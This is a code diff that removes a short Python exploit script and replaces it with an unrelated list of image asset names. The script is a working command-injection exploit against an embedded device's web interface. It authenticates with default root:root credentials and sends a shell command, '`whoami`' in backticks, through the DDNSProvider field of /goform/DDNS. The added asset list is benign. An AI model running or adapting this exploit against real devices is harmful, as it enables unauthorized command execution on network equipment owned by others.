@@ -1,44 +1,33 @@
-import sys
-import base64
-import requests
-
-ip = None
-token = None
-
-def login(name: str, passwd:str) -> str:
-    ret = ''
-    if name == None or passwd == None:
-        print('[login error.]')
-        return None
-    base = base64.b64encode(bytes(name + ':' + passwd, encoding='utf-8'))
-    base = str(base, encoding='utf-8')
-    print(base)
-    try:
-        l = requests.get(url=f'http://{ip}/Serial2Net.asp', headers={'Authorization':'Basic ' + base})
-        print(l.request.headers)
-        if(b'Unauthorized' in l.content):
-            print('[Acount Error]')
-        else:
-            ret = base
-    except Exception as e:
-        print('[login error]')
-        print(e)
-
-    return ret
-
-def codeInjection(cmd):
-    data = {'DDNSProvider':f'{cmd}', 'DDNS':'root','Account':"root",'Password':"root"}
-    header = {'Authorization':'Basic ' + token}
-    try:
-        attack = requests.post(url = f'http://{ip}/goform/DDNS', headers=header, data=data)
-        print(attack.content)
-    except Exception as e:
-        print(e)
-
-if __name__ == '__main__':
-    if(len(sys.argv) < 2):
-        print("Usage: exp.py <ip>")
-        exit(1)
-    ip = sys.argv[1]
-    token = login('root', 'root')
-    codeInjection('`whoami`')
+'again-attack'
+'attack-exit'
+'auto-logo'
+'buff-logo'
+'common-blue-exit'
+'common-box-confirm'
+'common-red-cancel'
+'common-red-exit'
+'common-yellow-confirm'
+'e-mail'
+'failed-logo'
+'flame'
+'goxie-accept'
+'goxie-logo'
+'goxie-refuse'
+'huijuan-big'
+'huijuan-normal'
+'huijuan-small'
+'k28-box-big'
+'k28-box-small'
+'k28-success-box'
+'ready'
+'realm-again'
+'realm-logo'
+'realm-success'
+'realm-ticket'
+'realm-wait'
+'royal-logo'
+'shiki-dir'
+'soul-logo'
+'success-damo'
+'willpower'
+'world-message'
